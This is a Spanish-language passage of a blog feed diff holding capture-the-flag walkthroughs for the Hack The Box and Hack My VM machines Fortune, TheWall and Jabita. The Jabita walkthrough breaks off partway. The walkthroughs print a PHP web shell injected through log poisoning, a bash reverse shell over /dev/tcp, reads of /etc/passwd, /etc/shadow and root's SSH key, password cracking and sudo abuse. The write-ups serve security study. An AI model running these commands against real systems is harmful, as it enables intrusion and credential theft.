+  <li><code class="language-plaintext highlighter-rouge">openssl x509 -req -in black.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out black.pem -days 1024</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Signature ok
+subject=C = ES, ST = Some-State, O = Fortune, OU = Fortune, CN = black@fortune.htb
+Getting CA Private Key
+</code></pre></div></div>
+
+<p>Finalmente usaremos <a href="https://www.openssl.org/docs/man1.1.1/man1/openssl-pkcs12.html"><code class="language-plaintext highlighter-rouge">pkcs12</code></a> para combinar mi nueva llave y <code class="language-plaintext highlighter-rouge">certificado cliente</code> en un archivo <code class="language-plaintext highlighter-rouge">PFX</code>, el cual es un formato el cual <code class="language-plaintext highlighter-rouge">FireFox</code> puede importar. Con el parámetro <code class="language-plaintext highlighter-rouge">-certfile</code> vamos a especificar el archivo de certificación, en este caso <code class="language-plaintext highlighter-rouge">intermediate.cert.pem</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">openssl pkcs12 -export -out black.pfx -inkey black.key -in black.pem -certfile intermediate.cert.pem</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter Export Password:
+Verifying - Enter Export Password:
+</code></pre></div></div>
+
+<p>Aquí podemos darle al <code class="language-plaintext highlighter-rouge">enter</code> para no poner ninguna contraseña, aunque si queréis podéis ponerle una.</p>
+
+<p>Bien! Ahora ya podemos pasar al paso final! Antes de continuar tenemos que añadir el certificado a <code class="language-plaintext highlighter-rouge">FireFox</code>, para ello nos iremos a ajustes y buscaremos por <code class="language-plaintext highlighter-rouge">cert</code>, nos saldrá un botón que se llama <code class="language-plaintext highlighter-rouge">Certificate Manager</code> o <code class="language-plaintext highlighter-rouge">Mánager de Certificaciones</code>, clicamos e importaremos (en el apartado <code class="language-plaintext highlighter-rouge">Your Certificates</code> o <code class="language-plaintext highlighter-rouge">Tus Certificados</code>) el archivo <code class="language-plaintext highlighter-rouge">PFX</code> que habíamos creado.</p>
+
+<p>Perfecto! Ahora sí ya tenemos todo listo! Podemos acceder sin problema al puerto <code class="language-plaintext highlighter-rouge">443</code> (<code class="language-plaintext highlighter-rouge">HTTPS</code>), por lo que nos dirigimos y nos saltará una ventana para confirmar si queremos o no utilizar el certificado importado, le daremos a <code class="language-plaintext highlighter-rouge">OK</code>.</p>
+
+<p>Una vez dentro veremos un texto que incluye un hipervínculo:</p>
+
+<blockquote>
+  <p>You will need to use the local authpf service to obtain elevated network access.
+If you do not already have the appropriate SSH key pair, then you will need to
+generate one and configure your local system appropriately to proceed.</p>
+</blockquote>
+
+<p>El mensaje nos dice que tenemos que utilizar el servicio local <code class="language-plaintext highlighter-rouge">authpf</code> para obtener un acceso de red elevado. Si no tenemos un par de llaves <code class="language-plaintext highlighter-rouge">SSH</code> apropiado tenemos que generar uno y configurarlo en nuestro sistema local para continuar.</p>
+
+<p>Bien, el hipervínculo nos lleva a <code class="language-plaintext highlighter-rouge">/generate/</code>, en el cual veremos una clave <code class="language-plaintext highlighter-rouge">RSA</code> que
+nos servirá para entrar sin proporcionar contraseña en la máquina como <code class="language-plaintext highlighter-rouge">nfsuser</code>. El usurio lo sabemos gracias al archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> y porque en el texto anterior nos dieron una pista.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
+bob:*:1001:1001::/home/bob:/bin/ksh
+nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
+</code></pre></div></div>
+
+<p>El usuario <code class="language-plaintext highlighter-rouge">nfsuser</code> es el único que tiene como Shell una <code class="language-plaintext highlighter-rouge">AuthPF</code>, por lo que nos queda conectarnos por SSH y continuar con la máquina.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ssh -i id_rsa nfsuser@10.10.10.127</code></li>
+</ul>
+
+<p>Bien! Ya estamos dentro!</p>
+
+<h2 id="reconocimiento-de-nuevo">Reconocimiento (De Nuevo)</h2>
+
+<p>Como nos dijeron antes, teniendo esto tenemos un acceso privilegiado a la red, por lo
+que si hay algún otro puerto abierto podremos verlo, aunque ahora lo haremos diferente
+ya que <code class="language-plaintext highlighter-rouge">NMAP</code> iba un poco lento, para ello creé un pequeño <code class="language-plaintext highlighter-rouge">script</code> en <code class="language-plaintext highlighter-rouge">Bash</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+
+function ctrl_c () {
+echo "\n\n[-] Saliendo ..."
+tput cnorm; exit 1
+}
+
+trap ctrl_c INT
+tput civis
+
+for port in $(seq 1 65535); do
+    timeout 1 bash -c "echo '' &gt; /dev/tcp/10.10.10.127/$port" 2&gt;/dev/null &amp;&amp; echo "[+] Port $port [ OPEN ]" &amp;
+done; wait
+tput cnorm
+</code></pre></div></div>
+<p>Cuando ejecutemos el <code class="language-plaintext highlighter-rouge">script</code> veremos varios puertos que antes no salían, aunque uno de ellos nos llama la atención, el <code class="language-plaintext highlighter-rouge">2049</code> corre el servicio <code class="language-plaintext highlighter-rouge">NFS</code>, por lo que podemos ver qué monturas están disponibles con <code class="language-plaintext highlighter-rouge">showmount -e 10.10.10.127</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Export list for 10.10.10.127:
+/home (everyone)
+</code></pre></div></div>
+<p>Vemos que el directorio <code class="language-plaintext highlighter-rouge">/home/</code> de la máquina está disponible para todos, por lo que nos crearemos un directorio en <code class="language-plaintext highlighter-rouge">/mnt/</code>, en mi caso se llamará <code class="language-plaintext highlighter-rouge">montura</code>, ahí es donde lo montaremos.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">mount -t nfs 10.10.10.127:/home /mnt/montura</code></li>
+</ul>
+
+<p>Bien! Ya lo tenemos en nuestra máquina! Cuando hago las máquinas estoy como <code class="language-plaintext highlighter-rouge">root</code>, por lo que mi <code class="language-plaintext highlighter-rouge">UserID</code> es <code class="language-plaintext highlighter-rouge">0</code>, así que si intentamos entrar en el directorio de <code class="language-plaintext highlighter-rouge">Charlie</code> no nos dejará, así que me creé un usuario (<code class="language-plaintext highlighter-rouge">adduser fortune</code>) y edité el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para que el nuevo usuario tenga la <code class="language-plaintext highlighter-rouge">UID</code> de <code class="language-plaintext highlighter-rouge">1000</code>. Realizando esto tendremos acceso a la carpeta que antes no podíamos entrar. Lo que acabamos de realizar se llama <code class="language-plaintext highlighter-rouge">UserID Spoofing</code>.</p>
+
+<h2 id="shell">Shell</h2>
+
+<p>Una vez dentro de la carpeta de <code class="language-plaintext highlighter-rouge">Charlie</code> veremos la carpeta <code class="language-plaintext highlighter-rouge">.ssh</code> con el archivo <code class="language-plaintext highlighter-rouge">authorized_keys</code>, como podemos editarlo crearemos un nuevo par de claves <code class="language-plaintext highlighter-rouge">SSH</code> para añadirlo al archivo, para ello utilizaremos <code class="language-plaintext highlighter-rouge">ssh-keygen</code>.</p>
+
+<p>Una vez tengamos el par de claves nos copiamos la <code class="language-plaintext highlighter-rouge">id_rsa</code> pública (<code class="language-plaintext highlighter-rouge">id_rsa.pub</code>) y la añadiremos al archivo <code class="language-plaintext highlighter-rouge">authorized_keys</code>, de tal manera que no necesitaremos contraseña para acceder por <code class="language-plaintext highlighter-rouge">SSH</code> como <code class="language-plaintext highlighter-rouge">Charlie</code>.</p>
+
+<p>Bien! Ya estamos en la máquina como <code class="language-plaintext highlighter-rouge">Charlie</code>!</p>
+
+<h2 id="subida-de-privilegios">Subida de privilegios</h2>
+
+<p>En el directorio personal de <code class="language-plaintext highlighter-rouge">Charlie</code> también nos encontramos con un archivo llamado <code class="language-plaintext highlighter-rouge">mbox</code>, el cual contiene un correo de parte de <code class="language-plaintext highlighter-rouge">Bob</code> que dice lo siguiente:</p>
+
+<blockquote>
+  <p>Hi Charlie,
+Thanks for setting-up pgadmin4 for me. Seems to work great so far.</p>
+
+  <p>BTW: I set the dba password to the same as root. I hope you don’t mind.</p>
+
+  <p>Cheers, Bob</p>
+</blockquote>
+
+<p>Bien, básicamente nos está agradeciendo que hayamos montado <code class="language-plaintext highlighter-rouge">pgadmin4</code> por él, parece que funciona bien por el momento. Nos menciona que la contraseña de la base de datos es la misma que la de <code class="language-plaintext highlighter-rouge">root</code> y que espera que no le importe.</p>
+
+<p>En el directorio <code class="language-plaintext highlighter-rouge">/var/appsrv/pgadmin4/</code> vemos un archivo <code class="language-plaintext highlighter-rouge">DB</code> llamado <code class="language-plaintext highlighter-rouge">pgadmin4.db</code>, con <code class="language-plaintext highlighter-rouge">sqlite3</code> nos diponemos a abrirlo para inspeccionarlo.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sqlite3 pgadmin4.db</code></li>
+  <li><code class="language-plaintext highlighter-rouge">sqlite&gt; .tables</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alembic_version roles_users
+debugger_function_arguments server
+keys servergroup
+module_preference setting
+preference_category user
+preferences user_preferences
+process version
+role
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sqlite&gt; SELCT * FROM server;</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz|[...]
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sqlite&gt; SELECT * FROM users;</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe
+2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQ
+</code></pre></div></div>
+
+<p>Como vemos tenemos el hash de <code class="language-plaintext highlighter-rouge">Charlie</code> y <code class="language-plaintext highlighter-rouge">Bob</code>, la fuerza bruta no aplica en este caso, por lo que tenemos que buscar otra manera de desencriptar esto. Tras buscar un rato llegamos a la ruta <code class="language-plaintext highlighter-rouge">/usr/local/pgadmin4/pgadmin4-3.4/web/pgadmin/utils/</code> que incluye un <code class="language-plaintext highlighter-rouge">script</code> en <code class="language-plaintext highlighter-rouge">Python</code> llamado <code class="language-plaintext highlighter-rouge">crypto.py</code> donde la función <code class="language-plaintext highlighter-rouge">decrypt</code> está definida.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def decrypt (ciphertext, key):
+    """
+    Decrypt the AES encrypted string.
+
+    Parameters:
+    ciphertext -- Encrypted string with AES method.
+    key -- key to decrypt the encrypted string.
+    """
+
+    global padding_string
+
+    ciphertext = base64.b64decode(ciphertext)
+    iv = ciphertext[:AES.block_size]
+    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
+    decrypted = cipher.decrypt(ciphertext[AES.block_size:])
+
+    return decrypted
+</code></pre></div></div>
+
+<p>Como vemos necesitamos dos valores, <code class="language-plaintext highlighter-rouge">chipertext</code> y <code class="language-plaintext highlighter-rouge">key</code>. Vemos que la función no muestra la contraseña, hace un <code class="language-plaintext highlighter-rouge">return</code>, así que al final del <code class="language-plaintext highlighter-rouge">script</code> podemos añadir lo siguiente para que nos muestre la contraseña desencriptada:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password = decrypt("utU[...]0GY/l8[...]ESGz", "$pbkdf2-sha512[...]QysAy7J/6cs[...]e9vg")
+print(password)
+</code></pre></div></div>
+<p>Bien! Hemos obtenido la contraseña de <code class="language-plaintext highlighter-rouge">root</code> (<code class="language-plaintext highlighter-rouge">root:R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!</code>) y por ende hemos resuelto la máquina! Esto sí ha sido un desafío!</p>]]></content><author><name>BlackCage</name><email>blackcage_jr@protonmail.com</email></author><category term="HTB" /><summary type="html"><![CDATA[Fortune [ Hack The Box ]]]></summary></entry><entry><title type="html">TheWall</title><link href="http://localhost:4000/posts/thewall-hmv/" rel="alternate" type="text/html" title="TheWall" /><published>2022-11-27T00:00:00+01:00</published><updated>2022-11-27T00:00:00+01:00</updated><id>http://localhost:4000/posts/thewall-hmv</id><content type="html" xml:base="http://localhost:4000/posts/thewall-hmv/"><![CDATA[<h1 id="thewall--hack-my-vm-">TheWall [ Hack My VM ]</h1>
+
+<h3 id="reconocimiento">Reconocimiento</h3>
+
+<p><strong>Descubrimiento de puertos y reconocimiento básico</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sS --min-rate 5000 192.168.1.114 -oG allPorts</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sCV -p22,80 192.168.1.114 -oN targeted</code></li>
+</ul>
+
+<p>No vemos nada interesante, sigamos investigando.</p>
+
+<h3 id="shell">Shell</h3>
+
+<p>Si miramos la página veremos que sólo pone un <code class="language-plaintext highlighter-rouge">Hello World!</code> en grande, por lo que poco podemos hacer, pero bueno, podemos seguir investigamos. Si vamos la ruta <code class="language-plaintext highlighter-rouge">/index.php</code> veremos el mismo mensaje, por lo que ya sabemos que está utilizando <code class="language-plaintext highlighter-rouge">PHP</code>.</p>
+
+<p>Con esto aprendido podemos hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> por archivos <code class="language-plaintext highlighter-rouge">PHP</code>, aunque si nos fijamos veremos que la página tiene un <code class="language-plaintext highlighter-rouge">WAF</code> (<code class="language-plaintext highlighter-rouge">Web Application Firewall</code>), por lo que si vamos muy rápido nos dará el mismo mensaje siempre (<code class="language-plaintext highlighter-rouge">Forbidden</code>). Para el siguiente paso utilizaré <code class="language-plaintext highlighter-rouge">GoBuster</code>, una herramienta creada en <code class="language-plaintext highlighter-rouge">GoLang</code> para hacer <code class="language-plaintext highlighter-rouge">fuzzing</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">gobuster dir -u "http://192.168.1.114" -w directory-list-2.3-medium.txt -x php - -delay 1s -t 1 --b 403,404</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php (Status: 200 ) [Size: 25 ]
+/includes.php (Status: 200 ) [Size: 2 ]
+</code></pre></div></div>
+
+<p>Tras esperar un buen rato vemos dos archivos, el respectivo <code class="language-plaintext highlighter-rouge">index.php</code> e <code class="language-plaintext highlighter-rouge">includes.php</code>, si abrimos dicho archivo veremos una página en blanco, podemos intuir (por el nombre) que dispondrá de algún parámetro que apuntará a un archivo local, por lo que podemos tratar de <code class="language-plaintext highlighter-rouge">fuzzear</code> ese parámetro. Para ello utilizaré <code class="language-plaintext highlighter-rouge">WFuzz</code>:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">wfuzz -u "http://192.168.1.114/includes.php?FUZZ=/etc/passwd" -w directory-list-2.3-medium.txt --hc=404 --hh=2 -t 200</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000217299: 200 28 L 41 W 1460 Ch "display_page"
+</code></pre></div></div>
+
+<p>Tras otro rato esperando vemos el parámetro <code class="language-plaintext highlighter-rouge">display_page</code>, así que si nos vamos a la web podemos ver el archivo que queramos de la máquina. Acabamos de encontrar un <code class="language-plaintext highlighter-rouge">LFI</code>!</p>
+
+<p>Con esto encontrado podemos hacer <code class="language-plaintext highlighter-rouge">Log Poisoning</code>, para eso me dirigiré a <code class="language-plaintext highlighter-rouge">/var/log/apache2/access.log</code>, vemos que existe, por lo que podemos  continuar. Con <code class="language-plaintext highlighter-rouge">NC</code> me conectaré al puerto <code class="language-plaintext highlighter-rouge">80</code> y mandaré una petición <code class="language-plaintext highlighter-rouge">GET</code> con un pequeño <code class="language-plaintext highlighter-rouge">script</code> en <code class="language-plaintext highlighter-rouge">PHP</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nc 192.168.1.114 80</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET &lt;?php system($_GET['cmd']); ?&gt;
+</code></pre></div></div>
+
+<p>Este pequeño <code class="language-plaintext highlighter-rouge">script</code> en <code class="language-plaintext highlighter-rouge">PHP</code> cogerá el <code class="language-plaintext highlighter-rouge">input</code> del parámetro <code class="language-plaintext highlighter-rouge">cmd</code>, lo ejecutará y lo mostrará en pantalla. Por lo que ya podemos ejecutar comandos en la máquina.</p>
+
+<p>Para conseguir una Shell me copié de <a href="https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/"><code class="language-plaintext highlighter-rouge">IronHackers</code></a> una Reverse Shell en <code class="language-plaintext highlighter-rouge">Bash</code> y la puse (intercambiando los <code class="language-plaintext highlighter-rouge">&amp;</code> por <code class="language-plaintext highlighter-rouge">%26</code> para no obtener problemas) en el parámetro <code class="language-plaintext highlighter-rouge">cmd</code>. Antes de todo esto me puse en escucha con <code class="language-plaintext highlighter-rouge">NC</code> por el puerto <code class="language-plaintext highlighter-rouge">4444</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nc -nlvp 4444</code></li>
+</ul>
+
+<p>Ahora sí, estamos preparados para lanzar la Reverse Shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.1.114/includes.php?display_page=bash -c 'bash -i &gt;%26 /dev/tcp/192.168.1.114/4444 0&gt;%261'
+</code></pre></div></div>
+<p>Bien! Hemos recibido una Shell como <code class="language-plaintext highlighter-rouge">www-data</code>!</p>
+
+<h3 id="subida-de-privilegios-1">Subida de privilegios #1</h3>
+
+<p>Ahora que ya estamos en la máquina víctima tenemos que tratar de ser <code class="language-plaintext highlighter-rouge">root</code>, pero antes de eso nos tenemos que convertir en <code class="language-plaintext highlighter-rouge">John</code>. Comencé por hacer <code class="language-plaintext highlighter-rouge">sudo -l</code> para listar todo lo que podía hacer en la máquina.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for www-data on TheWall:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on TheWall:
+    (john : john) NOPASSWD: /usr/bin/exiftool
+</code></pre></div></div>
+<p>Vemos que puedo ejecutar como <code class="language-plaintext highlighter-rouge">John</code> una herramienta llamada <code class="language-plaintext highlighter-rouge">ExifTool</code>. Si nos vamos a <a href="https://gtfobins.github.io/gtfobins/exiftool/#sudo"><code class="language-plaintext highlighter-rouge">GTFOBins</code></a> vemos que podemos escribir un archivo con dicha herramienta, por lo que decidí generarme un par de llaves <code class="language-plaintext highlighter-rouge">SSH</code> en mi máquina de atacante con <code class="language-plaintext highlighter-rouge">ssh-keygen</code> y copiar la clave pública (<code class="language-plaintext highlighter-rouge">id_rsa.pub</code>) en el directorio <code class="language-plaintext highlighter-rouge">/tmp/</code> de la máquina víctima.</p>
+
+<p>Con esto hecho seguí las instrucciones de <a href="https://gtfobins.github.io/gtfobins/exiftool/#sudo"><code class="language-plaintext highlighter-rouge">GTFObins</code></a>, quedándome así la instrucción:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub</code></li>
+</ul>
+
+<p>Esto ha hecho que copiemos nuestra <code class="language-plaintext highlighter-rouge">id_rsa</code> pública en un archivo llamado <code class="language-plaintext highlighter-rouge">authorized_keys</code>, el
+cual al estar ahí nuestra llave podemos conectarnos como <code class="language-plaintext highlighter-rouge">John</code> sin proporcionar contraseña.</p>
+
+<h3 id="subida-de-privilegios-2">Subida de privilegios #2</h3>
+
+<p>Una vez que estemos como <code class="language-plaintext highlighter-rouge">John</code> en la máquina ya podemos seguir nuestra misión, conseguir ser <code class="language-plaintext highlighter-rouge">root</code>, para ello (y tras varios minutos buscando) con el comando <code class="language-plaintext highlighter-rouge">id</code> listé los grupos a los que pertenecía, pertenecía al grupo <code class="language-plaintext highlighter-rouge">1000</code> , por lo que me puse a buscar ficheros que pertenezcan a dicho grupo.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">find / -group 1000 2&gt;/dev/null</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ ... ]
+/usr/sbin/tar
+[ ... ]
+</code></pre></div></div>
+
+<p>Vemos un fichero llamado <code class="language-plaintext highlighter-rouge">tar</code>, vamos a ver qué capacidades tiene con <code class="language-plaintext highlighter-rouge">/sbin/getcap -r 2&gt;/dev/null</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ ... ]
+/usr/sbin/tar cap_dac_read_search=ep
+[ ... ]
+</code></pre></div></div>
+
+<p>Como vemos tiene la capacidad de leer archivos. Me encontré un artículo de <a href="https://tbhaxor.com/exploiting-linux-capabilities-part-2/"><code class="language-plaintext highlighter-rouge">TBHaxor</code></a> que explica muy bien cómo poder explotar dicha capacidad, por lo seguí sus pasos, aunque cambiándolo un poco.</p>
+
+<p>Si nos vamos a la raíz del sistema vemos dos archivos, un <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> el cual
+pertenece a <code class="language-plaintext highlighter-rouge">root</code> y otro archivo, <code class="language-plaintext highlighter-rouge">id_rsa</code> (el privado) que no podemos leer, por lo que podemos intuir que es de <code class="language-plaintext highlighter-rouge">root</code>. Vámonos al directorio <code class="language-plaintext highlighter-rouge">/tmp/</code>.</p>
+
+<p>Bien, es la hora de explotar la capacidad de <code class="language-plaintext highlighter-rouge">TAR</code>, para ello hacemos lo siguiente:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/sbin/tar -czf root.id_rsa /id_rsa</code></li>
+</ul>
+
+<p>Como vemos se nos creó un archivo llamado <code class="language-plaintext highlighter-rouge">root.id_rsa</code> (o como le hayáis puesto) que si lo leemos tendrá la clave privada de <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>Enhorabuena! Hemos obtenido <code class="language-plaintext highlighter-rouge">root</code> en la máquina víctima de forma sencilla!</p>]]></content><author><name>BlackCage</name><email>blackcage_jr@protonmail.com</email></author><category term="HMV" /><summary type="html"><![CDATA[TheWall [ Hack My VM ]]]></summary></entry><entry><title type="html">Jabita</title><link href="http://localhost:4000/posts/jabita-hmv/" rel="alternate" type="text/html" title="Jabita" /><published>2022-11-27T00:00:00+01:00</published><updated>2022-11-27T00:00:00+01:00</updated><id>http://localhost:4000/posts/jabita-hmv</id><content type="html" xml:base="http://localhost:4000/posts/jabita-hmv/"><![CDATA[<h1 id="jabita--hack-my-vm-">Jabita [ Hack My VM ]</h1>
+
+<h3 id="reconocimiento">Reconocimiento</h3>
+<h5 id="descubrimiento-de-puertos-y-reconocimiento-básico">Descubrimiento de puertos y reconocimiento básico</h5>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sS --min-rate 5000 192.168.1.115 -oG allPorts</code></li>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sCV -p22,80 192.168.1.115 -oN targeted</code></li>
+</ul>
+
+<p>No vemos nada interesante, sigamos investigando.</p>
+
+<h3 id="shell">Shell</h3>
+<p>Una vez entramos en la página vemos un texto sin relevancia, como no vemos ningún hipervínculo ni comentarios en el código de la página pazaremos a <code class="language-plaintext highlighter-rouge">fuzzear</code> la página, para ello utilizaremos <code class="language-plaintext highlighter-rouge">WFuzz</code>, una herramienta hecha en <code class="language-plaintext highlighter-rouge">Python</code> que nos ayudará en la búsqueda de directorios.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">wfuzz -u "http://192.168.1.115/FUZZ" -w directory-list-2.3-medium.txt --hc 404</code></li>
+</ul>
+
+<p>Tras esperar unos segundos veremos un resultado, <code class="language-plaintext highlighter-rouge">building</code>. Si inspeccionamos la página veremos que ahora sí hay algo más, arriba vemos tres hipervínculos, los cuales tienen un parámetro que nos llama la atención, <code class="language-plaintext highlighter-rouge">page=</code>, vamos a ver si es vulnerable a <code class="language-plaintext highlighter-rouge">LFI</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">curl http://192.168.1.115/building/index.php?page=/etc/passwd</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+root:x:0:0:root:/root:/bin/bash
+[...]
+jack:x:1001:1001::/home/jack:/bin/bash
+jaba:x:1002:1002::/home/jaba:/bin/bash
+</code></pre></div></div>
+
+<p>Bien! Vemos que sí es vulnerable! Tras un intento fallido de listar la <code class="language-plaintext highlighter-rouge">id_rsa</code> de los usuarios <code class="language-plaintext highlighter-rouge">jack</code> y <code class="language-plaintext highlighter-rouge">jaba</code> por curiosidad probé con <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, un archivo el cual (generalmente) está protegido, aunque no es el caso.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
+jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
+</code></pre></div></div>
+
+<p>Además el hash de <code class="language-plaintext highlighter-rouge">root</code> (el cual no es crackeable) vemos otros dos hashes, el de <code class="language-plaintext highlighter-rouge">jack</code> y el de <code class="language-plaintext highlighter-rouge">jaba</code> (tampoco es crackeable), por lo que vamos a copiarnos esa información y con <code class="language-plaintext highlighter-rouge">John</code> crackear la contraseña de <code class="language-plaintext highlighter-rouge">Jack</code>.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">john hash.txt -w=/usr/share/wordlists/rockyou.txt</code></li>
+</ul>
+
+<p>Bien! <code class="language-plaintext highlighter-rouge">John</code> ha sido capaz de crackear al contraseña (<code class="language-plaintext highlighter-rouge">jack:joaninha</code>)!</p>
+
+<h3 id="subida-de-privilegios-1">Subida de privilegios #1</h3>
+<p>Bien, ahora que ya estamos en la máquina por <code class="language-plaintext highlighter-rouge">SSH</code> tenemos que convertirnos en <code class="language-plaintext highlighter-rouge">jaba</code> para luego poder convertirnos en <code class="language-plaintext highlighter-rouge">root</code>, para ello comenzé por hacer <code class="language-plaintext highlighter-rouge">sudo -l</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for jack on jabita:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never
+ 
+User jack may run the following commands on jabita:
+    (jaba : jaba) NOPASSWD: /usr/bin/awk
+</code></pre></div></div>
+
+<p>Como vemos <code class="language-plaintext highlighter-rouge">Jack</code> puede ejecutar <code class="language-plaintext highlighter-rouge">AWK</code> como el usuario <code class="language-plaintext highlighter-rouge">Jaba</code> sin proporcionar contraseña, para poder explotarlo nos vamos a <a href="https://gtfobins.github.io/gtfobins/awk/#sudo"><code class="language-plaintext highlighter-rouge">GTFObins</code></a>, el cual nos dice cómo hacerlo.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sudo -u jaba awk 'BEGIN {system("/bin/sh")}'</code></li>
+</ul>
+
+<p>Estupendo! Ya estamos en la máquina como <code class="language-plaintext highlighter-rouge">Jaba</code>!</p>
+
+<h3 id="subida-de-privilegios-2">Subida de privilegios #2</h3>
+<p>Bien, ahora que ya hemos escalado privilegios ya podemos pasar a ser <code class="language-plaintext highlighter-rouge">root</code>, para ello vuelvo a ejecutar <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for jaba on jabita:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never
+ 
+User jaba may run the following commands on jabita:
+    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
+</code></pre></div></div>
+
+<p>Como vemos podemos ejecutar con <code class="language-plaintext highlighter-rouge">Python</code> un <code class="language-plaintext highlighter-rouge">script</code> llamado <code class="language-plaintext highlighter-rouge">clean.py</code> como <code class="language-plaintext highlighter-rouge">root</code>. Si lo ejecutamos sólo nos saldrá un simple <code class="language-plaintext highlighter-rouge">Hello</code>. Por desgracia no podemos escribir en este archivo, pero vemos que está importando un módulo llamado <code class="language-plaintext highlighter-rouge">wild</code>, vamos a buscarlo:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">find / -iname wild.py 2&gt;/dev/null</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/lib/python3.10/wild.py
+</code></pre></div></div>
+
+<p>Vemos que nos ha salido un resultado, si abrimos el archivo veremos lo siguiente:</p>
+
+<pre><code class="language-Python">def first():
+    print("Hello")
+</code></pre>
+
